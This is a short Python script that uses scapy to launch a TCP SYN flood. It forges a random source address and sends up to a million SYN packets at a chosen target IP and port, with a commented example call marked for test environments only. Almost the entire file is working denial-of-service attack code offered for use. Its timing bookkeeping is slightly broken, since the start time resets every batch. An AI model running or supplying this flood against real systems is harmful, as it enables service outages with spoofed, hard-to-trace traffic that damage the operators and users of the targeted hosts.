from scapy.all import *
import random
import time

from scapy.layers.inet import IP, TCP


def syn_flood(target_ip, target_port, packets_per_batch=10000, batches=100):
    total_packets_sent = 0
    src_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
    src_port = random.randint(1024, 65535)
    ip = IP(src=src_ip, dst=target_ip)
    tcp = TCP(sport=src_port, dport=target_port, flags="S", seq=random.randint(1000, 100000))
    start_time = time.time()
    for batch in range(batches):
        print(f"\n[Batch {batch + 1}/{batches}] Sending {packets_per_batch} SYN packets...")

        start_time = time.time()

        for _ in range(packets_per_batch):
            send(ip/tcp, verbose=False)
            total_packets_sent += 1




        #total_packets_sent += packets_per_batch

        #print(f"Batch duration: {batch_duration:.4f} seconds")
        #print(f"Average time per packet: {avg_time_per_packet:.6f} seconds")
    end_time = time.time()
    batch_duration = end_time - start_time
    avg_time_per_packet = batch_duration / packets_per_batch
    print(f"\n--- SYN flood simulation complete ---")
    print(f"Total packets sent: {total_packets_sent}")

# Example usage (USE ON TEST ENVIRONMENT ONLY)
# syn_flood("192.168.1.100", 80)